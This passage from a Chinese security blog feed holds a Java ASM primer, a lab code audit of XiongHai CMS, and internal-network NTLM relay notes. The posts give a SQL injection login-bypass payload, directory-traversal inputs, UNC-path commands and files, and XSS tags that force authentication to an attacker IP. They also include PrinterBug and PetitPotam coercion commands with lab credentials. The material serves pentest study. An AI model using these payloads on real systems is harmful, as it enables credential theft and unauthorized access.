        <content type="html"><![CDATA[<p>来学习一下java的ASM，和class字节码以及一些简单的jvm知识也记录在这，参考文章：<a href="https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.javabetter.cn/jvm/class-file-jiegou.html">https://lsieun.github.io/java/asm/java-asm-season-01.html，https://www.javabetter.cn/jvm/class-file-jiegou.html</a></p><p>因为后面java反序列化的学习还需要动态生成恶意字节码，所以来补补基础。</p><h1><span id="java类文件结构">Java类文件结构</span></h1><h1><span id="asm介绍">ASM介绍</span></h1><p>ASM就是一个操作java字节码的类库。</p><p>ASM的操作对象字节码数据，就是.java文件经过javac之后生成的.class文件。</p><p>ASM处理字节码的步骤就是：拆分-&gt;修改-&gt;合并</p><ul><li>第一步，将 <code>.class</code> 文件拆分成多个部分；</li><li>第二步，对某一个部分的信息进行修改；</li><li>第三步，将多个部分重新组织成一个新的 <code>.class</code> 文件。</li></ul><h2><span id="版本问题">版本问题</span></h2><p>不同的ASM版本对应不同的Java版本，高版本可以兼容低版本</p><table><thead><tr><th>ASM Release</th><th>Release Date</th><th>Java Support</th></tr></thead><tbody><tr><td>2.0</td><td>2005-05-17</td><td>Java 5 language support</td></tr><tr><td>3.2</td><td>2009-06-11</td><td>support for the new <code>invokedynamic</code> code.</td></tr><tr><td>4.0</td><td>2011-10-29</td><td>Java 7 language support</td></tr><tr><td>5.0</td><td>2014-03-16</td><td><strong>Java 8 language support</strong></td></tr><tr><td>6.0</td><td>2017-09-23</td><td>Java 9 language support</td></tr><tr><td>6.1</td><td>2018-03-11</td><td>Java 10 language support</td></tr><tr><td>7.0</td><td>2018-10-27</td><td><strong>Java 11 language support</strong></td></tr><tr><td>7.1</td><td>2019-03-03</td><td>Java 13 language support</td></tr><tr><td>8.0</td><td>2020-03-28</td><td>Java 14 language support</td></tr><tr><td>9.0</td><td>2020-09-22</td><td>Java 16 language support</td></tr><tr><td>9.1</td><td>2021-02-06</td><td><strong>JDK 17 support</strong></td></tr><tr><td>9.2</td><td>2021-06-26</td><td>JDK 18 support</td></tr><tr><td>9.3</td><td>2022-04-04</td><td></td></tr><tr><td>9.4</td><td>2022-10-02</td><td></td></tr><tr><td>9.5</td><td>2023-03-24</td><td></td></tr></tbody></table><h2><span id="asm能做的事">ASM能做的事</span></h2><ul><li>父类：修改成一个新的父类</li><li>接口：添加一个新的接口、删除已有的接口</li><li>字段：添加一个新的字段、删除已有的字段</li><li>方法：添加一个新的方法、删除已有的方法、修改已有的方法</li><li>…等等</li></ul><h1><span id="asm生成新的类">ASM生成新的类</span></h1>]]></content>
      
      
      <categories>
          
          <category> java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熊海cms代码审计</title>
      <link href="/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1><span id="环境安装">环境安装</span></h1><p>来审一下这个简单cms学习一下，熊海cms直接网上找就可以</p><p>采用phpstudy进行配置，然后要提前建立一个数据，他不会自动帮你建</p><p>安装好后首页就是这样的</p><p><img src="http://cdn.clown2024.cn/202407151712203.png" alt="image-20240521001351083"></p><h1><span id="开始审计">开始审计</span></h1><h2><span id="目录结构">目录结构</span></h2><p><img src="http://cdn.clown2024.cn/202407151712204.png" alt="image-20240523235111948"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">admin         --管理后台文件夹<br>css           --存放css的文件夹<br>files         --存放页面的文件夹<br>images        --存放图片的文件夹<br>inc           --存放网站配置文件的文件夹<br>install       --网站进行安装的文件夹<br>seacmseditor  --编辑器文件夹<br>template      --模板文件夹<br>upload        --上传功能文件夹<br>index.php     --网站首页<br></code></pre></td></tr></table></figure><p>先直接放进seay里面扫一下</p><p><img src="http://cdn.clown2024.cn/202407151712205.png" alt="image-20240523235351518"></p><p>看起来还蛮少的，那就直接针对每个漏洞类型去看看</p><h2><span id="文件包含漏洞">文件包含漏洞</span></h2><p><strong>第一处文件包含</strong></p><p>根目录下的index.php源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显的文件包含，存在目录穿越漏洞，我在网站上级目录放了flag.php用来测试，r为空就会包含files目录下的index，给r传一个..&#x2F;..&#x2F;flag即可目录穿越</p><p><img src="http://cdn.clown2024.cn/202407151712206.png" alt="image-20240524000419879"></p><p>能配合文件上传就能够发挥大用处，目前暂时读读文件只能</p><p>addslashes是用来转义一些特殊字符的</p><p><img src="http://cdn.clown2024.cn/202407151712207.png" alt="image-20240524000753569"></p><p><strong>第二处文件包含</strong></p><p>第二处在&#x2F;admin&#x2F;index.php处</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>该页面默认会加上login参数</p><p><img src="http://cdn.clown2024.cn/202407151712208.png" alt="image-20240524001055974"></p><p>一样的目录穿越漏洞</p><p><img src="http://cdn.clown2024.cn/202407151712209.png" alt="image-20240524001024759"></p><h2><span id="sql注入">SQL注入</span></h2><p>admin&#x2F;files下面的页面就报了很多sql的漏洞</p><p>但是我想先去看一下login页面，因为很多漏洞都是后台页面，登陆都绕过不过去怎么进后台利用呢，而且这个cms应该没有预编译习惯，login页面的sql应该也是有漏洞，我就去看了一下，还真有</p><p><strong>admin&#x2F;files&#x2F;login.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../inc/conn.php&#x27;</span>;<br><span class="hljs-variable">$login</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>];<br><span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$checkbox</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checkbox&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$login</span>&lt;&gt;<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL语句有误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-variable">$users</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)) &#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$passwords</span>=<span class="hljs-variable">$users</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)&lt;&gt;<span class="hljs-variable">$passwords</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment">//写入登录信息并记住30天</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$checkbox</span>==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;this.location=&#x27;?r=index&#x27;&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看这里没有转义那就肯定有sql注入了，可以看一下他的校验逻辑，查询指定用户然后从数据库中获取他的密码，与我们的密码md5之后进行比较，若相等则登陆成功</p><p>那这里我就采用了联合注入，然后输入密码为1，查询的值为1的md5，最终成功绕过</p><blockquote><p>不过字段数需要尝试一下，这里试出来是有8个</p></blockquote><p>最终payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user=-1&#x27; union select 1,1,1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;,1,1,1,1#&amp;password=1&amp;checkbox=1&amp;login=yes<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151712210.png" alt="image-20240524003328983"></p><p>而且身份竟然是admin，这里还没看出为什么突然就admin了，源码好像没看到相关的</p><p><img src="http://cdn.clown2024.cn/202407151712211.png" alt="image-20240524003529583"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-NTLM中继专题</title>
      <link href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/"/>
      <url>/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1><span id="ntlm协议">NTLM协议</span></h1><p>NTLM(NT LAN Manager)是一套 Windows 安全协议，旨在为用户提供具有完整性和机密性的身份验证。</p><p>NTLM 是基于质询&#x2F;应答模式的身份验证协议，其过程是加密的，验证过程中不会通过网络传输用户的明文密码。</p><p>NTLM验证的加密算法为NTLM Hash，用于用户明文密码的加密，其计算的哈希值存储在本地的SAM文件中，域内用户的哈希值存储在域控的NTDS.dit文件中。</p><p>本地用户登录验证时，就是将输入的密码转化为NTLM Hash然后与SAM文件中的NTLM Hash比较。</p><p>文件中存储的哈希值格式类似如下：</p><p><img src="http://cdn.clown2024.cn/202407151446349.png" alt="image-20240517104232456"></p><p>上图有两个哈希，第一个是LM Hash，第二个是NTLM Hash。</p><p>LM Hash 是 LM(LAN Manager)验证机制的加密算法。LM 是在 NTLM 出现之前Windows 使用的验证机制。LM 自身存在的缺陷使得LM Hash 加密强度不高，以至很容易被破解，所以 LM 逐渐被 NTLM 所淘汰。NTLM有 NTLM v1、NTLM v2、NTLM v2Session 三个版本，目前使用最多的是 NTLM v2 版本。</p><h1><span id="ntlm认证机制">NTLM认证机制</span></h1><h2><span id="ntlm在工作组环境的认证">NTLM在工作组环境的认证</span></h2><p>NTLM采用了一种一种基于质询&#x2F;应答模式的身份验证机制，认证过程会产生三种类型的消息：</p><p>TYPE1，协商(Negotiate);TYPE 2，质询(Challenge);TYPE 3，身份验证(Authenticate)</p><p><img src="http://cdn.clown2024.cn/202407151446350.png" alt="image-20240517103005341"></p><p>具体过程：</p><ol><li>当客户端要访问服务器上某个受保护的服务时，需要输入服务器的用户名和密码进行验证。此时客户端会在本地缓存一份服务器密码的 NTLM Hash，然后向服务器发送TYPE1Negotiate 消息。该消息中包含一个以明文表示的用户名以及其他协商信息，如需要认证的主体和需要使用的服务等。</li><li>服务器收到客户端发送的 TYPE1消息后，先判断本地账户中是否有 TYPE1消息中的用户名。如果有,服务器就会选出自己能够支持和提供的服务内容,生成并回复 TYPE2 Challenge 消息。该消息中包含了一个由服务端生成的 16 位随机值 Challenge，服务器也会在本地缓存该值。</li><li>客户端收到 TYPE 2消息后，会使用步骤1中缓存的服务器的 NTLM Hash 对Challenge 进行加密并生成Response，然后将Response、用户名和Challenge 等组合得到 Net-NTLM Hash，再将 Net-NTLM Hash 封装到 TYPE3 Authenticate 消息中发往服务器。</li><li>服务器在收到 TYPE3消息后,用自己密码的NTLMHash对 Challenge 进行加密并比较自己计算的 Response 与客户端发送的 Response 是否一致。如果一致，就证明客户端掌握了服务器的密码，认证成功，否则认证失败。</li></ol><h2><span id="ntlm在域环境的认证">NTLM在域环境的认证</span></h2><p>域环境中，域用户的哈希值都存储在域控的NTDS.dit中，服务器本身无法计算Response消息，因此需要和域控建立一个安全通道，并通过域控完成最终的认证流程。</p><p><img src="http://cdn.clown2024.cn/202407151446351.png" alt="image-20240517141109345"></p><ol><li>域用户输入自己的账号密码登录客户端主机时，客户端会将用户输入的密码转换为NTLM Hash缓存，当用户想访问某台服务器的服务时，就会发送TYPE1 Negotiate消息</li><li>同工作组环境中的认证</li><li>同工作组环境中的认证</li><li>服务器收到TYPE3 消息之后会转发给域控</li><li>域控根据TYPE3消息获取对应用户的本地存储NTLM Hash，然后对原始Challenge计算生成Response，然后和TYPE3消息中的Response比对</li><li>服务器根据域控返回的验证结果，对客户端进行回复</li></ol><h2><span id="net-ntlm-hash">Net-NTLM Hash</span></h2><h3><span id="net-ntlm-hash组成">Net-NTLM Hash组成</span></h3><p>Net-NTLM Hash是上面TYPE3消息中包含的，是在网络环境下NTLM认证的哈希值。在NTLM  v1和NTLM v2中，Net-NTLM Hash也可以分为v1和v2两个版本，构成如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># Net-NTLM Hash v1<br>uername::hostname::LM response:NTLM response:challenge<br># Net-NTLM Hash v2<br>username::domain:challenge:HMAC-MD5:blob<br></code></pre></td></tr></table></figure><p>可以从NTLM认证的数据包中提取Net-NTLM Hash，下面是Net-NTLM Hash v2的提取过程</p><ol><li><p>从TYPE 2 消息的数据包中提取得到Challenge</p><p><img src="http://cdn.clown2024.cn/202407151446352.png" alt="image-20240517154219376"></p></li><li><p>HMAC-MD5对应TYPE3数据包中的NTProofStr</p><p><img src="http://cdn.clown2024.cn/202407151446353.png" alt="image-20240517154324541"></p></li><li><p>User name和Domain在TYPE3数据包中都可以找到，blob为数据包中的Response减去NTProofStr后剩下的部分</p><p><img src="http://cdn.clown2024.cn/202407151446354.png" alt="image-20240517154720777"></p></li><li><p>再根据Net-NTLM Hash v2的构成将上面的数据组合起来即可</p><p><img src="http://cdn.clown2024.cn/202407151446355.png" alt="image-20240517154802759"></p></li></ol><h3><span id="net-ntlm-hash利用">Net-NTLM Hash利用</span></h3><p>实战中可以通过中间人的方法截获认证请求获得Net-NTLM Hash，然后可以暴力破解并获得客户端用户的明文密码。</p><p>这里有另一种利用方法，<strong>NTLM Relay</strong>。</p><p>NTLM Relay攻击就是通过中间人对NTLM认证过程的流量进行转发，从而允许中间人使用客户端的身份认证服务，过程如图所示：</p><p><img src="http://cdn.clown2024.cn/202407151446356.png" alt="image-20240517155502009"></p><p>要实现该过程，要先解决如何触发客户端向Attacker发起NTLM认证请求，其次要决定将客户端的请求拦截后认证到什么样的服务。</p><h1><span id="发起并截获ntlm请求">发起并截获NTLM请求</span></h1><p>NTLM 是一种嵌入式协议，消息的传输依赖使用 NTLM 进行认证的上层协议，如SMB、LDAP、HTTP、MSSQL 等。因此，只要是使用这些协议的应用程序都可以要求用户发起 NTLM 请求。测试人员可通过 Responder 等工具对用户的 NTLM 认证请求进行拦截，并获取其 Net-NTLM Hash。</p><p>Responder 是一款可以在局域网模拟各种服务器(SMB、LDAP、HTTP、MSSQL、WPAD、FTP、POP3、IMAP、SMTP)进行中间人攻击的工具，当用户连接这些服务器时，该工具将截获用户的认证请求，如图所示：</p><p><img src="http://cdn.clown2024.cn/202407151446357.png" alt="image-20240517160601855"></p><p><img src="http://cdn.clown2024.cn/202407151446358.png" alt="image-20240517160627078"></p><blockquote><p>kali中已经默认安装了responder可以直接使用，需要root权限运行</p></blockquote><h2><span id="ntlm攻击常用方法">NTLM攻击常用方法</span></h2><p>在Windows中，通过设置指向恶意服务器的UNC路径，能够使受害机器自动使用当前用户凭证向恶意服务器发起NTLM认证</p><h3><span id="系统命令">系统命令</span></h3><p>很多系统命令都可以传入UNC路径，这里列举常用的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">net use \\10.10.10.147\share<br><span class="hljs-built_in">dir</span> \\10.10.10.147\share<br>attrib \\10.10.10.147\share<br>bcdboot \\10.10.10.147\share<br>bdeunlock \\10.10.10.147\share<br>cacls \\10.10.10.147\share<br>certreq \\10.10.10.147\share<br>certutil \\10.10.10.147\share<br>cipher \\10.10.10.147\share<br>ClipUp -l \\10.10.10.147\share<br>cmdl32 \\10.10.10.147\share<br>cmstp /s \\10.10.10.147\share<br>colorcpl \\10.10.10.147\share<br>comp /N=0 \\10.10.10.147\share<br>compact \\10.10.10.147\share<br>control \\10.10.10.147\share<br>Defrag \\10.10.10.147\share<br>diskperf \\10.10.10.147\share<br>dispdiag -out \\10.10.10.147\share<br>doskey /MACROFILE=\\10.10.10.147\share<br>esentutl /k \\10.10.10.147\share<br><span class="hljs-built_in">expand</span> \\10.10.10.147\share<br>extract32 \\10.10.10.147\share<br>FileHistory \\10.10.10.147\share<br>findstr * \\10.10.10.147\share<br>fontview \\10.10.10.147\share<br>fvenotify \\10.10.10.147\share<br>FXSCOVER \\10.10.10.147\share<br>hwrcomp -check \\10.10.10.147\share<br>hwrreg \\10.10.10.147\share<br>icacls \\10.10.10.147\share<br>licensingdiag -cab \\10.10.10.147\share<br>lodctr \\10.10.10.147\share<br>lpksetup /p \\10.10.10.147\share /s<br>makecab \\10.10.10.147\share<br>msiexec /update \\10.10.10.147\share /quiet<br>msinfo32 \\10.10.10.147\share<br>mspaint \\10.10.10.147\share<br>msra /openfile \\10.10.10.147\share<br>mstsc \\10.10.10.147\share<br>netcfg -l \\10.10.10.147\share -c p -i foo<br></code></pre></td></tr></table></figure><p>这里用net use命令来测试一下</p><p><img src="http://cdn.clown2024.cn/202407151446359.png" alt="image-20240517162021631"></p><p><img src="http://cdn.clown2024.cn/202407151446360.png" alt="image-20240517162105436"></p><p>我们这里成功截获到了Net-NTLM Hash v2</p><h3><span id="desktopini文件">Desktop.ini文件</span></h3><p>Windows系统文件夹下有一个隐藏文件 desktop.ini,用来指定和存储文件夹图标之类的个性化设置</p><p>如图，desktop.ini中的IconResource为文件夹的图标路径，可以改为UNC路径并指向恶意服务器。当用户访问该文件夹时将自动请求恶意服务器上的图标资源，Responder即可截获用户的Net-NTLM Hash</p><p><img src="http://cdn.clown2024.cn/202407151446361.png" alt="image-20240517163327639"></p><p><img src="http://cdn.clown2024.cn/202407151446362.png" alt="image-20240517163336432"></p><p><img src="http://cdn.clown2024.cn/202407151446363.png" alt="image-20240517163408543"></p><p>我们测试的时候可以新建一个文件夹，然后修改改文件夹为随便一个图标就会出现desktop.ini文件，然后就可以修改了(要把隐藏重要系统文件关掉才会出现)</p><blockquote><p>我自己测试的时候复现失败了不知道为什么</p></blockquote><h3><span id="scf文件">SCF文件</span></h3><p>SCF 文件是 Windows 文件资源管理器命令文件，也是一种可执行文件。该文件中的IconFile 属性可以指定 UNC 路径，Windows 文件资源管理器将尝试加载 IconFile 属性指定的文件图标。</p><p>在一个文件夹下新建一个test.scf文件，写入下面内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[Shell]<br>Command=2<br>IconFile=\\192.168.20.128\share\test.ico<br>[Taskbar]<br>Command=TogleDesktop<br></code></pre></td></tr></table></figure><p>然后访问文件夹即可截获</p><blockquote><p>这里也复现失败了奇怪了</p></blockquote><h3><span id="pdf文件">PDF文件</span></h3><p>PDF 规范允许为 GoTobe 和 GoTOR条目加载远程内容。测试人员可以在 PDF 文件中插入 UNC 路径，当用户通过 PDF 阅读器(Adobe Reader)打开 PDF 文档时，将向恶意服务器发起 NTLM 认证请求。</p><p>相关利用工具有Bad-PDF和Worse-PDF</p><p>以badpdf为例</p><p><img src="http://cdn.clown2024.cn/202407151446364.png" alt="image-20240517174014128"></p><p>然后将生成的test.pdf上传到受害机，用Adobe Reader打开文件后，而已服务器就会截获用户的Net-NTLM Hash。emmm但是感觉适用面有点窄，只有Adobe Reader打开才发起NTLM请求，正常浏览器打开无事发生。</p><p>而且多年前就出现补丁了感觉基本没用了属于是</p><h3><span id="office文档">Office文档</span></h3><p>Office 文档的 document.xml.rels 文件可以插入 UNC 路径，并向 UNC 地址指定的服务器发起 NTLM 请求。</p><p>制作流程如下：</p><ol><li><p>新建一个Word文档，任意插入一张图片后保存，用压缩软件打开</p></li><li><p>在word&#x2F;_rels下找到document.xml.rels文件，找到刚才插入图片对应的Target参数，将其修改为指向而已服务器的UNC路径，并加上TargetMode&#x3D;”External”属性</p><p><img src="http://cdn.clown2024.cn/202407151446365.png" alt="image-20240517175701097"></p><p><img src="http://cdn.clown2024.cn/202407151446366.png" alt="image-20240517175820073"></p></li><li><p>将该文件上传到受害机器，文件被打开后就可以截获到Net-NTLM Hash</p></li></ol><blockquote><p>难绷又复现失败了。。。不知道是不是只适合旧版本的office</p></blockquote><h3><span id="privexchange漏洞">PrivExchange漏洞</span></h3><p>Microsoft Exchange 允许任意关联了Exchange 邮箱的用户通过EWS接口来创建一个推送订阅(Push Subscription)，并可以指定任意 URL 作为通知推送的目的地。</p><p>当触发通知推送时，Exchange 将使用 CredentialCache.DefaultCredentials 发出 HTTP 请求，并以机器账户的身份发起 NTLM 认证。该漏洞本质是一个 SSRF。</p><p>具体的使用可以网上找POC验证。</p><h3><span id="printerbug漏洞">PrinterBug漏洞</span></h3><p>Windows 中的MS-RPRN(Print System Remote Protocol，打印系统远程协议)用于打印客户端和打印服务器之间的通信，支持客户端和服务器之间的同步打印和联机操作包括打印任务控制、打印系统管理。</p><p>MS-RPRN 中定义的RpcRemoteFindFirstPrinterChangeNotification API可以创建远程修改通知对象，用于监控对打印机对象的修改，并向打印客户端发送修改通知。任何具备域用户权限的测试人员都可以滥用该方法来强迫运行打印服务(PrintSpooler)的主机向恶意服务器发起 Kerberos 或 NTLM 身份认证请求。并且，由于 Print Spooler 服务以NTAUTHORITY\SYSTEM 账户的身份运行,因此最终通过 Responder 截获的是目标机器账户的 Net-NTMLHash。微软并不承认这是一个洞，所以未进行任何修复。</p><p>相关利用工具有SpoolSample.exe和Printerbug.py，开启Responder监听后，执行下面命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python printerbug.py hack-my.com/Marcus:Marcus\@123@10.10.10.20 10.10.10.147<br></code></pre></td></tr></table></figure><p>通过 printerbug·py 连接到受害机器(10.10.10.20)，以迫使它向测试人员所控的恶意服务器(10.10.10.147)发起 NTLM 认证。Responder 上成功截获受害机器的 Net-NTML Hash</p><p><img src="http://cdn.clown2024.cn/202407151446367.png" alt="image-20240517183241095"></p><h3><span id="petitpotam漏洞">PetitPotam漏洞</span></h3><p>当Print Spooler服务被关闭后，PrinterBug漏洞就无法利用，该漏洞可以用于替代PrinterBug方法。</p><p>MS-EFSR中有一组API，可通过FileName参数指定UNC 路径。例如，EfsRpcOpenFileRaw API的语法格式如下，可以打开服务器上的加密对象进行备份或还原。</p><p><img src="http://cdn.clown2024.cn/202407151446369.png" alt="image-20240517183953529"></p><p>PetitPotam就是通过利用这些API来向恶意服务器发起NTLM认证请求，然后截获Net-NTLM Hash</p><p>与PrinterBug一样，PetitPotam也需要有一个域用户权限。</p><p>注意，在 Windows Server 2008&#x2F;2012 上，由于可匿名访问的命名管道默认不为空，因此导致可以匿名触发。</p><p>开启监听执行下面命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python PetitPotam.py -d hack-my.com -u Marcus -p Marcus\@123 10.10.10.147 10.10.10.20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151446370.png" alt="image-20240517184536531"></p><h2><span id="常见web漏洞利用">常见Web漏洞利用</span></h2><h3><span id="xss">XSS</span></h3><p><strong>构造UNC路径，触发SMB请求并向恶意服务器发起NTLM认证</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"># 使用于<span class="hljs-variable constant_">IE</span>浏览器<br>&lt;scripts src=<span class="hljs-string">&quot;\\10.10.10.147\xss&quot;</span>&gt;&lt;/script&gt;<br># 借助<span class="hljs-variable constant_">LLMNR</span>/<span class="hljs-variable constant_">NBNS</span>，适用于<span class="hljs-variable constant_">IE</span>和<span class="hljs-title class_">Edge</span>浏览器<br>&lt;scripts src=<span class="hljs-string">&quot;\\UnknownName\xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><blockquote><p>LLMNR（Link-Local Multicast Name Resolution）和NBNS（NetBIOS Name Service）是两种网络服务协议，它们用于在局域网（LAN）中解析主机名到IP地址。</p></blockquote><ul><li><p>LLMNR是微软开发的一个基于IPv6的名称解析服务，用于在没有DNS服务器的情况下解析本地网络上的主机名。</p></li><li><p>它使用IPv6的链路本地地址作为通信媒介，通过发送多播消息来解析主机名。</p></li><li><p>LLMNR通常用于小型网络或家庭网络，其中可能没有配置DNS服务器。</p></li><li><p>NBNS是NetBIOS（Network Basic Input&#x2F;Output System）名称服务的缩写，是早期Windows网络中用于名称解析的一个服务。</p></li><li><p>NBNS使用NetBIOS协议，通过广播或多播消息来解析网络上的NetBIOS名称到IP地址。</p></li><li><p>NBNS主要用于基于NetBIOS的网络，如Windows NT和早期的Windows版本。</p></li></ul><p><strong>构造http路径，通过http向恶意服务器发起NTLM认证请求</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;scripts src=<span class="hljs-string">&quot;//10.10.10.147/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在Microsoft Edge等浏览器中存在信任区域(Trusted Zones)，其中包括互联网(Internet)、本地内部网(Local Internet)、受信任的站点(Trusted Sites)和受限制的站点(Restricted Sites)这几个区域</p><p><img src="http://cdn.clown2024.cn/202407151446371.png" alt="image-20240528233328349"></p><p>每个区域都对应不同的安全等级，并关联不同的限制条件。</p><p>默认情况下，只有当某站点的域名在本地内部网(Local Intranet)或受信任的站点(Trusted Sites)列表中时，浏览器才会自动使用当前计算机已登录的用户名和密码进行NTLM 认证；其余情况都需要用户手动输入身份进行验证。</p><p>通常，许多组织将企业子域名所托管的所有数据标记为可信数据。</p><p><img src="http://cdn.clown2024.cn/202407151446372.png" alt="image-20240528233641528"></p><p>*.hack-my.com 位于白名单中，那么测试人员只需要获取*.hack-my.com 下的某台服务器使用该服务器启动 Responder 监听，就可以让浏览器自动以登录用户的凭据发起 NTLM认证</p><p>因此我们可以Powermad项目的Invoke-DNSUpdate.ps1脚本可用来向域内添加一条新的 DNS 记录，由于域内的成员默认具有添加 